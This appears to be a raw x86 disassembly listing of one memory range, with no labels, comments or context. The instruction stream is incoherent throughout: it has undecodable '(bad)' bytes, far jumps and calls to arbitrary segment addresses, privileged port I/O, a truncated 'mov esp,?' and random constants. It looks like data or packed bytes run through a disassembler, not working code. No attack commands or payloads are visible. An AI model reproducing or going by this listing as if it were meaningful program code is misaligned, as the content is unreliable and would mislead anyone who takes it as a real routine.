  427c5a:	sar    DWORD PTR [esi+0x52],0xa7
  427c5e:	and    ch,BYTE PTR [eax-0x35]
  427c61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427c62:	push   0xc
  427c64:	fisttp WORD PTR [ecx-0x69]
  427c67:	rcl    BYTE PTR [edx+0x77c2a3bf],1
  427c6d:	pop    esi
  427c6e:	pushf  
  427c6f:	cld    
  427c70:	test   DWORD PTR [eax-0x42569139],edi
  427c76:	adc    eax,edi
  427c78:	es add eax,0x7ec1b4bb
  427c7e:	(bad)  
  427c80:	adc    BYTE PTR [ecx-0x17],bl
  427c83:	mov    bh,0x1e
  427c85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427c86:	repz dec eax
  427c88:	lahf   
  427c89:	mov    dh,0x14
  427c8b:	inc    esp
  427c8c:	dec    edx
  427c8d:	in     eax,0x3e
  427c8f:	adc    al,0xfc
  427c91:	mov    edi,0x96d4700
  427c96:	cmp    BYTE PTR [ebp-0x69],0x50
  427c9a:	cli    
  427c9b:	std    
  427c9c:	jg     0x427d0f
  427c9e:	loope  0x427c63
  427ca0:	loopne 0x427cb8
  427ca2:	div    cl
  427ca4:	sub    al,0xd4
  427ca6:	sbb    al,0xac
  427ca8:	cmp    edi,eax
  427caa:	sbb    ch,BYTE PTR [edx]
  427cac:	and    eax,0x56043da8
  427cb1:	popf   
  427cb2:	mov    esi,0x47bfaa3
  427cb7:	sar    DWORD PTR [esp+esi*4+0x61],cl
  427cbb:	mov    al,ds:0x628fd0c4
  427cc0:	inc    esp
  427cc1:	(bad)  
  427cc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427cc3:	stos   BYTE PTR es:[edi],al
  427cc4:	mov    eax,0xe47b76e2
  427cc9:	push   cs
  427cca:	shl    BYTE PTR [ebp-0x3],0x7e
  427cce:	les    ebx,FWORD PTR [ecx+0x6]
  427cd1:	jne    0x427d37
  427cd3:	and    DWORD PTR [edi-0x2e0f09d0],ebx
  427cd9:	fs xchg dx,ax
  427cdc:	repnz xor esi,edx
  427cdf:	sar    DWORD PTR [edx+0x5442b4c4],cl
  427ce5:	iret   
  427ce6:	sbb    eax,0xa4cdb2d2
  427ceb:	jl     0x427ca3
  427ced:	inc    eax
  427cee:	mov    al,ds:0x16ab08d6
  427cf3:	pop    ss
  427cf4:	xchg   BYTE PTR ds:0x80b08f61,ah
  427cfa:	shl    BYTE PTR [edi],cl
  427cfc:	add    al,0xd9
  427cfe:	dec    esp
  427cff:	cmc    
  427d00:	cmp    al,0x4f
  427d02:	xchg   ebp,esi
  427d04:	or     al,0x56
  427d06:	pop    ecx
  427d07:	leave  
  427d08:	fdiv   DWORD PTR [edi-0x2b4aa789]
  427d0e:	clc    
  427d0f:	imul   BYTE PTR [ebp+ebp*1-0x393992a9]
  427d16:	jge    0x427d07
  427d18:	outs   dx,DWORD PTR ds:[esi]
  427d19:	inc    esi
  427d1a:	aaa    
  427d1b:	call   0xc499452b
  427d20:	jb     0x427d9b
  427d22:	or     DWORD PTR [esi-0x5aff0dda],ebx
  427d28:	mov    eax,ds:0x2ad92c0c
  427d2d:	rcl    BYTE PTR [ecx-0x42],1
  427d30:	(bad)  [esi+0x49c5d59f]
  427d36:	push   esi
  427d37:	mov    esp,0x5e652f44
  427d3c:	aad    0x60
  427d3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427d3f:	jg     0x427d3f
  427d41:	pop    ecx
  427d42:	mov    esp,?
  427d44:	ret    
  427d45:	cmc    
  427d46:	pop    edi
  427d47:	add    DWORD PTR [ebx-0x5],ebp
  427d4a:	cmp    BYTE PTR [ebx+0x35],0x19
  427d4e:	das    
  427d4f:	vcvttsd2si ebx,QWORD PTR [edi]
  427d53:	inc    ecx
  427d54:	scas   ax,WORD PTR es:[edi]
  427d56:	and    bh,BYTE PTR [esi+0x5688ba45]
  427d5c:	mov    cl,0x10
  427d5e:	add    BYTE PTR [edx],dl
  427d60:	mov    ebx,0x704156dc
  427d65:	mov    esp,0xc34a86c8
  427d6a:	mov    al,0x86
  427d6c:	inc    edi
  427d6d:	int3   
  427d6e:	aas    
  427d6f:	xor    edx,DWORD PTR [edx-0x722f74c8]
  427d75:	add    DWORD PTR [edx+0x6126fb52],esi
  427d7b:	loopne 0x427d12
  427d7d:	cmp    BYTE PTR [esi-0x563bffee],0xde
  427d84:	mov    DWORD PTR ds:[eax],edi
  427d87:	into   
  427d88:	and    eax,0xacfa6eee
  427d8d:	adc    BYTE PTR [esi],cl
  427d8f:	test   BYTE PTR [ebp+0x10b1b188],0xa5
  427d96:	int    0xac
  427d98:	pop    ds
  427d99:	addr16 out 0x5e,eax
  427d9c:	repz test al,0x40
  427d9f:	jne    0x427d7c
  427da1:	cdq    
  427da2:	loop   0x427d2d
  427da4:	inc    edi
  427da5:	sbb    ebx,0xbe0c9aa1
  427dab:	and    BYTE PTR [ebx+ebp*2+0x7b0570b6],al
  427db2:	mov    esp,0x28874211
  427db7:	dec    eax
  427db8:	inc    edi
  427db9:	mov    al,0x7e
  427dbb:	xor    eax,0x8ab3034c
  427dc0:	pop    ecx
  427dc1:	std    
  427dc2:	fidiv  DWORD PTR [ebp-0x4b39d8ea]
  427dc8:	(bad)  
  427dc9:	or     eax,0x4a530323
  427dce:	scas   eax,DWORD PTR es:[edi]
  427dcf:	xchg   esi,eax
  427dd0:	cld    
  427dd1:	lock push ebx
  427dd3:	sbb    dh,0xf5
  427dd6:	mov    ds:0x52e9df76,al
  427ddb:	pushf  
  427ddc:	data16 cmp al,0x4a
  427ddf:	sbb    dl,al
  427de1:	inc    eax
  427de2:	cdq    
  427de3:	and    eax,0xd65b54ef
  427de8:	inc    edx
  427de9:	pop    esp
  427dea:	jmp    DWORD PTR [ebx]
  427dec:	cs xor dl,ch
  427def:	push   ebx
  427df0:	(bad)  
  427df1:	xlat   BYTE PTR ds:[ebx]
  427df2:	push   es
  427df3:	sub    edi,esp
  427df5:	mov    esi,DWORD PTR [ecx]
  427df7:	ins    DWORD PTR es:[edi],dx
  427df8:	out    0x62,eax
  427dfa:	fimul  WORD PTR [edx+0x77]
  427dfd:	mov    al,BYTE PTR [ebx+0x55]
  427e00:	push   0x78
  427e02:	lahf   
  427e03:	inc    esp
  427e04:	and    ch,BYTE PTR [ecx+0x31]
  427e07:	pop    esp
  427e08:	mov    DWORD PTR [ecx],eax
  427e0a:	mov    ebp,0xa689622c
  427e0f:	xlat   BYTE PTR ds:[ebx]
  427e10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427e11:	jmp    0x427da0
  427e13:	add    DWORD PTR [edi+0x4b29b6e7],edx
  427e19:	adc    eax,0x602d11c
  427e1e:	out    0x86,al
  427e20:	in     eax,0x83
  427e22:	stos   BYTE PTR es:[edi],al
  427e23:	cwde   
  427e24:	cmp    al,0x8b
  427e26:	arpl   cx,cx
  427e28:	adc    bl,BYTE PTR [edi-0x44]
  427e2b:	xor    BYTE PTR [edx+0x2],bh
  427e2e:	mulps  xmm4,XMMWORD PTR [eax-0x27]
  427e32:	mov    ah,dh
  427e34:	nop
  427e35:	cld    
  427e36:	shl    BYTE PTR [eax],0xe1
  427e39:	(bad)
  427e3c:	daa    
  427e3d:	mov    ch,0x49
  427e3f:	jae    0x427e89
  427e41:	repnz rcl edi,1
  427e44:	push   esi
  427e45:	or     eax,0x684e4416
  427e4a:	ficom  DWORD PTR ds:0xdfe374f8
  427e50:	(bad)  
  427e51:	in     al,dx
  427e52:	lea    ebp,[ebp-0x448f0c9f]
  427e58:	aas    
  427e59:	ds add al,bl
  427e5c:	sub    eax,DWORD PTR [ecx]
  427e5e:	loope  0x427e90
  427e60:	add    DWORD PTR [ecx-0x3d90450a],0xffffffe6
  427e67:	cmp    ah,BYTE PTR ds:0x485e7887
  427e6d:	mov    BYTE PTR [ebx+0x34a6c10d],ch
  427e73:	or     esp,0x49
  427e76:	sbb    dh,BYTE PTR [esi-0x1e]
  427e79:	gs pop esi
  427e7b:	aaa    
  427e7c:	jo     0x427e22
  427e7e:	xchg   ebx,eax
  427e7f:	jo     0x427e27
  427e81:	cmp    ebp,DWORD PTR [esi+0x7dec4fc4]
  427e87:	ja     0x427e85
  427e89:	call   0x6a38412d
  427e8e:	ja     0x427e4a
  427e90:	fistp  QWORD PTR [ebp-0xbaa36fd]
  427e96:	cmp    al,0x64
  427e98:	lock sub al,0x24
  427e9b:	pop    eax
  427e9c:	pop    ss
  427e9d:	fmul   st,st(2)
  427e9f:	push   esp
  427ea0:	ins    BYTE PTR es:[edi],dx
  427ea1:	jle    0x427e7b
  427ea3:	xchg   DWORD PTR [edx+0x6c],esp
  427ea6:	mov    eax,ebp
  427ea8:	je     0x427e56
  427eaa:	xor    eax,0xdeb2821f
  427eaf:	idiv   DWORD PTR [ebp-0x39083074]
  427eb5:	push   es
  427eb6:	add    BYTE PTR [ecx-0x80],0x13
  427eba:	adc    eax,0x64b4293b
  427ebf:	sub    DWORD PTR [ecx-0x35],esp
  427ec2:	cmc    
  427ec3:	mov    DWORD PTR ds:0x7c4c4d17,0x8ee0689d
  427ecd:	adc    ebp,DWORD PTR [eax]
  427ecf:	mov    bh,0x9f
  427ed1:	dec    ebp
  427ed2:	stos   BYTE PTR es:[edi],al
  427ed3:	sbb    DWORD PTR [ecx],edx
  427ed5:	jmp    0x9060:0xfa7a7fc7
  427edc:	xor    BYTE PTR [edx],dl
  427ede:	jmp    DWORD PTR [edx+0x257bcb5a]
  427ee4:	leave  
  427ee5:	ret    0xecb5
  427ee8:	cmc    
  427ee9:	mov    ebx,0x8ff03cf1
  427eee:	lahf   
  427eef:	aad    0xf0
  427ef1:	xor    al,BYTE PTR [ebx-0x2e]
  427ef4:	(bad)  
  427ef5:	mov    bl,BYTE PTR [eax]
  427ef7:	hlt    
  427ef8:	xchg   ebp,eax
  427ef9:	popa   
  427efa:	nop
  427efb:	(bad)  
  427efc:	sub    ah,bh
  427efe:	push   cs
  427eff:	or     cl,BYTE PTR [esi]
  427f01:	inc    ecx
  427f02:	and    BYTE PTR [edx],dh
  427f04:	jnp    0x427edd
  427f06:	push   edx
  427f07:	inc    ebp
  427f08:	in     al,0xf3
  427f0a:	arpl   WORD PTR [ecx+0x58],dx
  427f0d:	mov    eax,ds:0x63b27ebd
  427f12:	or     eax,0x9a84f246
  427f17:	inc    ebp
  427f18:	pop    edi
  427f19:	adc    al,BYTE PTR [ebx+0x3471ce6]
  427f1f:	pop    edi
  427f20:	repnz mov bl,0xf2
  427f23:	pop    esi
  427f24:	iret   
  427f25:	jp     0x427f1f
  427f27:	xchg   edi,eax
  427f28:	sti    
  427f29:	pop    esp
  427f2a:	cli    
  427f2b:	inc    ebp
  427f2c:	mov    ds:0x8da669f4,al
  427f31:	icebp  
  427f32:	push   esi
  427f33:	mov    eax,ds:0x9901f1c8
  427f38:	gs popf 
  427f3a:	nop
  427f3b:	pop    ss
  427f3c:	bound  bp,DWORD PTR [eax+0x69]
  427f40:	nop
  427f41:	imul   BYTE PTR [edx+0x2fcf2f37]
  427f47:	mov    edi,0x6a85e03c
  427f4c:	push   ebp
  427f4d:	cmc    
  427f4e:	out    dx,al
  427f4f:	aam    0x49
  427f51:	inc    esp
  427f52:	mov    esi,0xa126
	...
  427f5f:	add    BYTE PTR [eax],al
  427f61:	mov    ah,0x8b
  427f63:	(bad)
  427f66:	fbstp  TBYTE PTR [esi-0x1e57cf15]
  427f6c:	mov    ebx,0xa1378410
  427f71:	or     ebp,esi
  427f73:	add    DWORD PTR [eax],eax
  427f75:	lods   al,BYTE PTR ds:[esi]
  427f76:	add    eax,DWORD PTR [eax]
  427f78:	add    BYTE PTR [esi+ebx*4+0x385c87b8],bh
  427f7f:	pop    DWORD PTR [ecx-0x9c84541]
  427f85:	inc    esp
  427f86:	scas   eax,DWORD PTR es:[edi]
  427f87:	jae    0x427ff3
  427f89:	cld    
  427f8a:	mov    cl,0xbe
  427f8c:	sbb    cl,BYTE PTR [ecx]
  427f8e:	cs cmc 
  427f90:	inc    ecx
  427f91:	add    eax,0xe97744fe
  427f96:	pop    ebx
  427f97:	or     DWORD PTR [ebx],ecx
  427f99:	lods   al,BYTE PTR ds:[esi]
  427f9a:	sahf   
  427f9b:	stos   DWORD PTR es:[edi],eax
  427f9c:	adc    dl,BYTE PTR [ebx-0x6c]
  427f9f:	add    dl,ah
  427fa1:	test   DWORD PTR [edx-0x78],0x87cef926
  427fa8:	jp     0x427f5f
  427faa:	pop    esi
  427fab:	mov    dh,0xad
  427fad:	fld    TBYTE PTR [eax+ecx*1-0x49]
  427fb1:	xchg   esp,eax
  427fb2:	(bad)  
  427fb3:	repz add eax,0x51487267
  427fb9:	or     dh,BYTE PTR [ebx+0x11ccb0d]
  427fbf:	js     0x427ff1
  427fc1:	inc    ebp
  427fc2:	mov    esi,0x50d59deb
  427fc7:	mov    esi,0x71a7eafd
  427fcc:	in     al,dx
  427fcd:	jmp    0xa69b:0x4451378a
  427fd4:	ret    0x36cd
  427fd7:	xor    BYTE PTR ss:[edi-0x64a28472],cl
  427fde:	adc    eax,0x20e59fb7
  427fe3:	add    ebx,0x8
  427fe6:	(bad)  
  427fe7:	daa    
  427fe8:	icebp  
  427fe9:	cmp    edi,DWORD PTR [eax+0x6d5be440]
  427fef:	addr16 loopne 0x427fc7
  427ff2:	out    dx,eax
  427ff3:	sbb    eax,0xd686ab4c
  427ff8:	pop    ds
  427ff9:	stos   DWORD PTR es:[edi],eax
  427ffa:	sub    eax,DWORD PTR [edx-0x4376db1d]
  428000:	cld    
  428001:	and    edi,DWORD PTR [edi]
  428003:	jno    0x428055
  428005:	icebp  
  428006:	pushf  
  428007:	sbb    eax,0xaaf4fcb7
  42800c:	scas   al,BYTE PTR es:[edi]
  42800d:	jge    0x428046
  42800f:	ret    0xe42
  428012:	add    eax,0x8e136ca2
  428017:	mov    esi,0x8a1c1ef4
  42801c:	in     eax,dx
  42801d:	push   edx
  42801e:	mov    al,ds:0x6b9a8f52
  428023:	sahf   
  428024:	scas   eax,DWORD PTR es:[edi]
  428025:	cmp    BYTE PTR [ecx],0xd9
  428028:	pop    es
  428029:	lea    eax,[edx+0x7b]
  42802c:	jnp    0x428084
  42802e:	push   edx
  42802f:	inc    ebx
  428030:	cmc    
  428031:	xchg   esp,eax
  428032:	xchg   edx,eax
  428033:	aad    0x40
  428035:	jmp    0x427fd8
  428037:	adc    BYTE PTR [eax+0xf],cl
  42803a:	lds    esi,FWORD PTR [edi]
  42803c:	jmp    0xa7b6:0x5f281320
  428043:	sub    eax,DWORD PTR [eax+edi*8]
  428046:	cmp    esp,DWORD PTR [edi]
  428048:	aas    
  428049:	push   eax
  42804a:	call   0x448a:0x21445fa2
  428051:	test   al,0x57
  428053:	in     eax,0x4a
  428055:	iret   
  428056:	test   DWORD PTR [esi+0x12d88ca2],eax
  42805c:	ror    BYTE PTR [esp+eiz*4+0x30ccd623],1
  428063:	imul   esp,DWORD PTR [ecx+0x25],0xf7dd9b
  42806a:	pop    ebp
  42806b:	or     al,0xe3
  42806d:	mov    dl,0x53
  42806f:	popa   
  428070:	mov    cl,0x0
  428072:	mov    ds:0xf4b7cbe3,al
  428077:	data16 sar BYTE PTR [esi-0x6ef7803d],0x8e
  42807f:	sbb    al,0x17
  428081:	sbb    edx,0x77cb91a9
  428087:	pop    ebp
  428088:	sbb    ebp,DWORD PTR [ecx]
  42808a:	data16 repz cmp al,0x4b
  42808e:	add    eax,0x7174d344
  428093:	fcomp  DWORD PTR [ecx]
  428095:	xchg   DWORD PTR ds:0xc4eaea29,ebp
  42809b:	cmp    edx,0x329849fd
  4280a1:	stos   BYTE PTR es:[edi],al
  4280a2:	jg     0x428100
  4280a4:	retf   
  4280a5:	cmp    DWORD PTR gs:[ecx],edx
  4280a8:	pushf  
  4280a9:	ins    DWORD PTR es:[edi],dx
  4280aa:	mov    al,0x24
  4280ac:	je     0x428046
  4280ae:	dec    edi
  4280af:	cmp    al,BYTE PTR [ecx]
  4280b1:	xlat   BYTE PTR ds:[ebx]
  4280b2:	dec    edx
  4280b3:	test   eax,0xf1610fc5
  4280b8:	das    
  4280b9:	or     esi,ebp
  4280bb:	in     al,dx
  4280bc:	or     BYTE PTR [edx+0x28f747e0],al
  4280c2:	pop    esi
  4280c3:	mov    ebx,0xc0775748
  4280c8:	sub    al,0xc7
  4280ca:	jb     0x4280ce
  4280cc:	cli    
  4280cd:	shl    bh,1
  4280cf:	daa    
  4280d0:	xor    DWORD PTR [edx-0x2518de31],esi
  4280d6:	mov    dl,0x89
  4280d8:	ret    
  4280d9:	imul   ebp,DWORD PTR [ecx-0x1dc3c32],0x59882016
  4280e3:	rcr    ebx,0x24
  4280e6:	outs   dx,DWORD PTR ds:[esi]
  4280e7:	xchg   esi,eax
  4280e8:	jo     0x428118
  4280ea:	and    BYTE PTR [ebp+0x0],ah
  4280ed:	jp     0x428110
  4280ef:	adc    DWORD PTR [ebp+0x729c7d6],edx
  4280f5:	ret    
  4280f6:	mov    ds:0xf53ea3ec,al
  4280fb:	in     eax,dx
  4280fc:	inc    edi
  4280fd:	mov    bh,al
  4280ff:	mov    BYTE PTR [esi],al
  428101:	out    dx,eax
  428102:	outs   dx,BYTE PTR ds:[esi]
  428103:	lea    edi,[ebx]
  428105:	pop    edi
  428106:	add    al,BYTE PTR [bp+di]
  428109:	imul   esp,DWORD PTR [ebp+eiz*4-0x2a7f31f],0x2a
  428111:	bound  ebx,QWORD PTR [edx+0x19]
  428114:	fdiv   QWORD PTR [edi+0x0]
  428117:	sti    
  428118:	call   0x545b:0xc6069932
  42811f:	test   DWORD PTR [ebx],ebx
  428121:	pop    ebp
  428122:	test   al,0x2f
  428124:	dec    esp
  428125:	mov    esp,0xe8cfa4d8
  42812a:	cmp    ah,al
  42812c:	fwait
  42812d:	pop    ecx
  42812e:	push   ebx
  42812f:	out    0x69,eax
  428131:	cld    
  428132:	and    esi,ebp
  428134:	loope  0x4280c3
  428136:	xchg   edx,eax
  428137:	inc    eax
  428138:	dec    ebx
  428139:	push   ds
  42813a:	xchg   ebx,eax
  42813b:	mov    dl,0xa5
  42813d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42813e:	mov    al,ds:0x23233ed6
  428143:	mov    dl,0xab
  428145:	push   es
  428146:	neg    BYTE PTR [ebx+0x4a43e96a]
  42814c:	add    eax,0x18e2efce
  428151:	jp     0x42819d
  428153:	and    al,0x3
  428155:	sbb    eax,0x31bcb9e7
  42815a:	int    0xaa
  42815c:	xchg   esp,eax
  42815d:	es clc 
  42815f:	pop    edx
  428160:	cdq    
  428161:	push   0x50
  428163:	adc    bl,BYTE PTR [esi+0x4959aba6]
  428169:	push   cs
  42816a:	cmp    DWORD PTR [edx+ebp*1+0x63],eax
  42816e:	sub    BYTE PTR [eax],ah
  428170:	push   esp
  428171:	pop    esi
  428172:	or     DWORD PTR [ecx+eax*4-0x174f2bf1],edi
  428179:	xor    eax,0xd4ae0e34
  42817e:	or     al,0xc1
  428180:	xchg   ecx,eax
  428181:	or     eax,0x13c16b02
  428186:	aas    
  428187:	dec    esi
  428188:	idiv   ch
  42818a:	ins    BYTE PTR es:[edi],dx
  42818b:	or     dl,ah
  42818d:	or     DWORD PTR [edi-0x36],esi
  428190:	jp     0x42815a
  428192:	mov    eax,0x5e7d6b1c
  428197:	je     0x428193
  428199:	mov    edx,es
  42819b:	push   esp
  42819c:	aaa    
  42819d:	inc    eax
  42819e:	mov    al,0xed
  4281a0:	mov    al,ds:0x4934c966
  4281a5:	xor    DWORD PTR [ecx],esi
  4281a7:	outs   dx,DWORD PTR ds:[esi]
  4281a8:	sbb    BYTE PTR [edx-0x43],ah
  4281ab:	fnstsw WORD PTR [ebp-0x44dbe979]
  4281b1:	mov    gs,WORD PTR [ecx+0x33]
  4281b4:	xlat   BYTE PTR ds:[ebx]
  4281b5:	xchg   ebp,eax
  4281b6:	and    al,0xe6
  4281b8:	je     0x42815d
  4281ba:	jne    0x428202
  4281bc:	push   edi
  4281bd:	add    bh,BYTE PTR [edi+0x3ec65133]
  4281c3:	sbb    al,0xed
  4281c5:	ret    
  4281c6:	aas    
  4281c7:	aaa    
  4281c8:	add    ecx,DWORD PTR [edi+ebx*1]
  4281cb:	dec    esp
  4281cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4281cd:	fisubr DWORD PTR [edx-0x7e]
  4281d0:	les    esp,FWORD PTR [esi-0x57609bc]
  4281d6:	das    
  4281d7:	jl     0x428171
  4281d9:	pop    edi
  4281da:	test   BYTE PTR [ebx],dl
  4281dc:	out    0xf0,eax
  4281de:	fidiv  DWORD PTR [ebp+0x12]
  4281e1:	jp     0x428253
  4281e3:	addr16 fsubrp st(6),st
  4281e6:	adc    BYTE PTR [esp+ecx*1],dh
  4281e9:	cs adc al,0xec
  4281ec:	mov    bh,0xc8
  4281ee:	sub    BYTE PTR [esi-0x26],bl
  4281f1:	repnz aad 0x22
  4281f4:	int3   
  4281f5:	sbb    ebp,DWORD PTR [eax+0x22]
  4281f8:	dec    esp
  4281f9:	fadd   DWORD PTR [edx+0x19]
  4281fc:	sbb    eax,0xfb9e782c
  428201:	xchg   DWORD PTR ds:0x4ab1b55d,esi
  428207:	iret   
  428208:	inc    ecx
  428209:	pop    ss
  42820a:	das    
  42820b:	sub    ah,BYTE PTR [edx-0x23582fa2]
  428211:	mov    esi,0x5c35c96e
  428216:	mov    dh,0x90
  428218:	lods   eax,DWORD PTR ds:[esi]
  428219:	add    bl,BYTE PTR [esi+0x20]
  42821c:	cmp    al,BYTE PTR [ebp-0x55]
  42821f:	add    edi,DWORD PTR [ebp+0x5d]
  428222:	mov    BYTE PTR [esi],dl
  428224:	mov    ecx,0x23d676c1
  428229:	les    ebx,FWORD PTR [ecx+0x3c]
  42822c:	mov    eax,ds:0x65c535fe
  428231:	mov    eax,ds:0x49c48c02
  428236:	push   ecx
  428237:	fnstsw WORD PTR [ecx+eiz*1-0x78ff4ab7]
  42823e:	in     eax,dx
  42823f:	jne    0x42828e
  428241:	adc    al,0xaf
  428243:	and    eax,0x8a00bad1
  428248:	jmp    0x4281fe
  42824a:	jecxz  0x42823e
  42824c:	clc    
  42824d:	pop    ds
  42824e:	pop    ds
  42824f:	fidivr DWORD PTR [ebp-0x1ffb3081]
  428255:	push   esi
  428256:	retf   0x329d
  428259:	nop
  42825a:	loopne 0x4281f2
  42825c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42825d:	mov    eax,ds:0x40ccbc6d
  428262:	and    esp,DWORD PTR [esi]
  428264:	je     0x42826b
  428266:	ret    0xb5a
  428269:	loop   0x4282c1
  42826b:	push   0xb0fbbd6
  428270:	adc    al,0x81
  428272:	xchg   ebp,eax
  428273:	push   cs
  428274:	das    
  428275:	ror    BYTE PTR gs:[ebx],cl
  428278:	and    cl,bh
  42827a:	pop    ebp
  42827b:	not    BYTE PTR [esi+edi*2]
  42827e:	cmp    BYTE PTR [ecx+0x7d],bl
  428281:	pop    es
  428282:	xchg   edi,eax
  428283:	loope  0x428297
  428285:	mov    eax,0xa640cf3e
  42828a:	adc    bh,dl
  42828c:	cmp    al,0x47
  42828e:	mov    ch,bh
  428290:	rcr    BYTE PTR [eax-0x71f91433],0xbf
  428297:	js     0x428306
  428299:	arpl   WORD PTR [ebx-0x27],di
  42829c:	and    eax,0xbe6474bd
  4282a1:	cld    
  4282a2:	mov    dl,0x78
  4282a4:	ficom  WORD PTR [ebx+0x0]
  4282a7:	stos   BYTE PTR es:[edi],al
  4282a8:	pop    ebp
  4282a9:	retf   0xf1c0
  4282ac:	mov    ebp,0x7bea235e
  4282b1:	sbb    ah,cl
  4282b3:	retf   
  4282b4:	xchg   ecx,eax
  4282b5:	add    bh,ah
  4282b7:	mov    DWORD PTR [edi+0x48],0x575f3c28
  4282be:	inc    esi
  4282bf:	ret    
  4282c0:	mov    edx,0x421701a7
  4282c5:	and    DWORD PTR [ebp-0xff5f610],ebp
  4282cb:	test   al,0x29
  4282cd:	repnz mov dl,0x75
  4282d0:	inc    esp
  4282d1:	sub    al,0xca
  4282d3:	imul   ebx,DWORD PTR [edx+0x70528dc1],0x26
  4282da:	dec    esp
  4282db:	sahf   
  4282dc:	mov    bh,0x7c
  4282de:	add    al,0x2
  4282e0:	adc    eax,0x2636abc2
  4282e5:	inc    esp
  4282e6:	gs xchg esp,eax
  4282e8:	fiadd  WORD PTR [edx-0x2804b233]
  4282ee:	retf   0x6680
  4282f1:	xor    BYTE PTR [ebx-0x4422ae11],ah
  4282f7:	pop    ebx
  4282f8:	popa   
  4282f9:	inc    ecx
  4282fa:	push   esi
  4282fb:	lods   eax,DWORD PTR ds:[esi]
  4282fc:	cmp    ebp,DWORD PTR [ebp-0x39]
  4282ff:	push   edi
  428300:	call   0x4d37:0x3d685b2e
  428307:	cmp    DWORD PTR [eax],0x260a64f6
  42830d:	jae    0x42833f
  42830f:	sbb    ebp,DWORD PTR [ecx-0x50]
  428312:	pushf  
  428313:	sahf   
  428314:	sbb    dl,bl
  428316:	std    
  428317:	dec    ebx
  428318:	les    ebx,FWORD PTR [edx-0x1dc2a670]
  42831e:	and    edi,ebx
  428320:	inc    edx
  428321:	repz sbb DWORD PTR [ecx+0x57],esi
	...
  428331:	ret    0x2f21
  428334:	cdq    
  428335:	out    dx,eax
  428336:	lahf   
  428337:	idiv   BYTE PTR [ebx+0x4f]
  42833a:	js     0x428313
  42833c:	jg     0x4282c6
  42833e:	pop    ss
  42833f:	mov    ds:0x1f8b5d7,al
  428344:	add    BYTE PTR [eax],bl
  428346:	add    BYTE PTR [eax],al
  428348:	add    bl,ch
  42834a:	add    BYTE PTR [edx+0x376bd624],0xab
  428351:	(bad)  [edi]
  428353:	and    eax,ecx
  428355:	ins    DWORD PTR es:[edi],dx
  428356:	mov    esp,0x888a1ff3
  42835b:	inc    edi
  42835c:	rol    DWORD PTR [esi],1
  42835e:	scas   al,BYTE PTR es:[edi]
  42835f:	fisttp DWORD PTR ds:0x0
	...
